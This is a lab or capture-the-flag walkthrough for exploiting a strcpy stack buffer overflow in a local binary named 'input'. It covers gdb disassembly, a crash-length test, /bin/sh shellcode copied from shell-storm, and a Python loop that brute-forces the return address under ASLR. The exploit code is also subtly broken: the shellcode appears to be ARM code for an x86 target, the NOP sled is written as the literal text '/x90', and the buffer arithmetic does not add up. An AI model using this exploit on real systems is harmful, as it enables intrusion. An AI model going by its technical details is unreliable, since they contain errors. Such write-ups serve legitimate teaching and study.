We have a binary on a linux machine called ***"input"***. Let's execute it and see what it does.  

    $ ./input                                                                    
    Syntax: ./input <input string>

So we know the program takes input from the user but we don't know what it does.  
Using gdb let's disassemble main and try to understand the flow of the program and what is happening.

    (gdb) disassemble main
    0x0804845d <+0>:     push   ebp
    0x0804845e <+1>:     mov    ebp,esp
    0x08048460 <+3>:     and    esp,0xfffffff0
    0x08048463 <+6>:     sub    esp,0xb0
    0x08048469 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
    0x0804846d <+16>:    jg     0x8048490 <main+51>
    0x0804846f <+18>:    mov    eax,DWORD PTR [ebp+0xc]
    0x08048472 <+21>:    mov    eax,DWORD PTR [eax]
    0x08048474 <+23>:    mov    DWORD PTR [esp+0x4],eax
    0x08048478 <+27>:    mov    DWORD PTR [esp],0x8048540
    0x0804847f <+34>:    call   0x8048310 <printf@plt>
    0x08048484 <+39>:    mov    DWORD PTR [esp],0x0
    0x0804848b <+46>:    call   0x8048340 <exit@plt>
    0x08048490 <+51>:    mov    eax,DWORD PTR [ebp+0xc]
    0x08048493 <+54>:    add    eax,0x4
    0x08048496 <+57>:    mov    eax,DWORD PTR [eax]
    0x08048498 <+59>:    mov    DWORD PTR [esp+0x4],eax
    0x0804849c <+63>:    lea    eax,[esp+0x11]
    0x080484a0 <+67>:    mov    DWORD PTR [esp],eax
    0x080484a3 <+70>:    call   0x8048320 <strcpy@plt>
    0x080484a8 <+75>:    mov    eax,0x0
    0x080484ad <+80>:    leave  
    0x080484ae <+81>:    ret    

The program starts by comparing (cmp) a value to the number 1 (0x1) at address ***0x08048469***.  
If the condition is true, it jumps to address ***0x8048490*** where it will execute the strcpy (***0x080484a3***) function and then exit the program.  
If the condition is false, the program will execute the printf (***0x0804847f***) function and exit.

We can understand that the program checks to see if it got more then 1 argument, if it did it will copy the second argument it got.

***strcpy*** is vulnerable to a Buffer Overflow attack because it does not check input length, so let's try to exploit it by understanding the length of the buffer.

    (gdb) run $(python -c "print('A'*171)")
    Starting program: /root/Desktop/Challenges/ReverseEngineering/1/input $(python -c "print('A'*171)")
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Program received signal SIGTRAP, Trace/breakpoint trap.
    0xf7c23203 in ?? () from /lib32/libc.so.6

After some inputs I found that the program crashes at 171 bytes. In order to exploit this binary, we need 3 things:
* A payload
* A NOP slide that leads the program into the start of the payload
* An address in the middle of the payload

Let's start by getting the payload.  
I Got this shellcode from ***https://shell-storm.org/shellcode/files/shellcode-698.html***:

    \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68

Now we need a NOP slide (NOP (/x90)is a character that tells the program to do No Operation, until it reaches a different character) that will "slide" the program to the start of the shell code payload.

Now we need an address that will be in the middle of the NOP slide.  
When I was looking for a good memory address, I saw that the address keep on changing and are randomized. That means that ASLR(Address space layout randomization) is enabled on the Linux machine.  
So let's pick a random address in the middle of the NOP slide ***0xffffcbe8***.

Since ASLR is on, let's just run the exploit in a loop until in gets the address we entered.

    import os

    for i in range(10000):
        address = '\xe8\xcb\xff\xff'
        shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
        os.system("./input " + "/x90" * 144 + shellcode + address)